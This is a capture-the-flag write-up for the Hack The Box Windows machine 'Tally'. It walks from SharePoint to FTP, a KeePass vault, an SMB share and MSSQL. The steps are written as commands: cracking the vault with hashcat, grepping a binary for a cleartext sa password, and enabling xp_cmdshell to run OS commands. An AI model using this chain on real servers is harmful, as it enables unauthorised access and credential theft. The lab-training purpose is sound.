## Overview

Tally is a hard-difficulty Windows (Server 2016) machine built around credential sprawl. Each service quietly hands you the key to the next: SharePoint → FTP → KeePass → SMB → MSSQL. The final MSSQL `sa` login allows OS command execution through `xp_cmdshell`, landing a shell as `tally\sarah` and the user flag. This post covers recon through user.

## Recon

| Port | Service |
|------|---------|
| 21   | FTP (Microsoft ftpd) |
| 80/443 | IIS 10 / Microsoft SharePoint |
| 139/445 | SMB |
| 1433 | MSSQL Server 2016 RTM |

```bash
nmap -sC -sV 10.129.1.183
```

IIS hosts a SharePoint instance — the obvious starting point on a Windows box with this much enterprise tooling.

## Enumeration

### SharePoint → FTP creds

Browsing the SharePoint document store directly exposes a file with FTP credentials:

```bash
# SharePoint list view often renders where the home page link is broken
curl -s http://10.129.1.183/_layouts/viewlsts.aspx
```

This yields `ftp_user:<redacted>`.

### FTP → KeePass vault

```bash
ftp 10.129.1.183
# binary mode is mandatory for the .kdbx to transfer intact
binary
get /User/Tim/Files/tim.kdbx
```

A `do to.txt` note points at the KeePass DB and a migration folder. Crack the vault offline:

```bash
keepass2john tim.kdbx > kdbx.hash
hashcat -m 13400 kdbx.hash /usr/share/wordlists/rockyou.txt
```

### KeePass → SMB → MSSQL creds

The recovered credentials open the `ACCT` SMB share. In `zz_Migration\Binaries\New folder\tester.exe`, the MSSQL `sa` password sits in cleartext:

```bash
smbclient //10.129.1.183/ACCT -U <user>
strings 'tester.exe' | grep -i -A2 -B2 'sql\|password'
```

## Foothold

The `sa` account is MSSQL's sysadmin. Log in with SQL auth (not Windows auth), enable `xp_cmdshell`, and run OS commands as the SQL service account:

```bash
impacket-mssqlclient sa:'<redacted>'@10.129.1.183
```

Feed a script with `-file` (piping over stdin makes the client loop on EOF):

```bash
printf 'enable_xp_cmdshell\nxp_cmdshell whoami\n' > q.sql
impacket-mssqlclient sa:'<redacted>'@10.129.1.183 -file q.sql
# => tally\sarah
```

Commands now execute as `tally\sarah` — the user who owns the flag.

## User flag

```bash
printf 'enable_xp_cmdshell\nxp_cmdshell type C:\\Users\\Sarah\\Desktop\\user.txt\n' > uf.sql
impacket-mssqlclient sa:'<redacted>'@10.129.1.183 -file uf.sql   # HTB{...}
```
